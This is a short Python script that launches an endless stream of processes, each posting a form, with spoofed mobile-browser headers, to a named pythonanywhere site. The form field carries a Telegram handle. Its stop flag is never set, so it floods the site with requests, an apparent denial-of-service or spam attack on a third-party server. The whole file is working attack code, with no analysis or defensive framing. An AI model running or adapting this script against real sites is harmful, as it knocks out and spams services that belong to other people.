import requests
from multiprocessing import Process

# Counter variable for the number of processes sent
process_count = 0

def send_request():
    global process_count

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://iosnemes1s.pythonanywhere.com',
        'Referer': 'https://iosnemes1s.pythonanywhere.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'ECIDnumber': 'telegram__@ARDIYOO',
    }

    response = requests.post('https://iosnemes1s.pythonanywhere.com/', headers=headers, data=data)

    # Update the process count
    process_count += 1

# Create a flag for stopping the program
stop_flag = False

# Start the processes
processes = []
while not stop_flag:
    process = Process(target=send_request)
    process.start()
    processes.append(process)

# Wait for all remaining processes to complete
for process in processes:
    process.join()
